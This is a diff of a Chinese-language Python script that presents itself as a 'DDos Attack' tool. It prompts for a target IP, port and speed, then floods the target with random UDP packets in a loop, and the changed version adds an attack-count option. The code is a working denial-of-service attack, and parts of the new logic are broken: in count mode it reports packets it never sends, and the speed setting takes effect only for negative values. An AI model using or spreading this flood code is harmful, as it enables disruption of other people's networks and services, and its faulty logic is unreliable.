@@ -21,26 +21,32 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print (" ")
-print ("/---------------------------------------------------\ ")
-print ("|   作者          : Andysun06                       |")
-print ("|   作者github    : https://github.com/Andysun06    |")
-print ("|   kali-QQ学习群 : 909533854                       |")
-print ("|   版本          : V1.0.0                          |")
-print ("\---------------------------------------------------/")
-print (" ")
-print (" -----------------[请勿用于违法用途]----------------- ")
-print (" ")
-ip = input("请输入 IP     : ")
-port = int(input("攻击端口      : "))
-sd = int(input("攻击速度(1~1000) : "))
-
+print ("github@Andysun06 by github@xiaoguansudio")
+print("DDOS自动攻击系统")
+print("谨慎使用，后果自负")
+print("  ")
+print("--------------------")
+print("  ")
+ip = input("请输入 IP : ")
+port = int(input("攻击端口: "))
+sd = int(input("攻击速度(1~10000)0为true: "))
+cs = int(input("攻击次数（0为无尽,若大于0则上一参数无效）："))
 os.system("clear")
 
+
 sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
-     time.sleep((1000-sd)/2000)
+i = 0
+if cs > 0:
+     for i in range(cs):
+          sent = sent + 1
+          print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
+else:
+     while True:
+          sock.sendto(bytes, (ip,port))
+          sent = sent + 1
+          print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
+          if sd < 0 :
+               time.sleep((10000-sd)/2000)
+          else:
+               print("电脑随时爆炸，请注意安全")
 
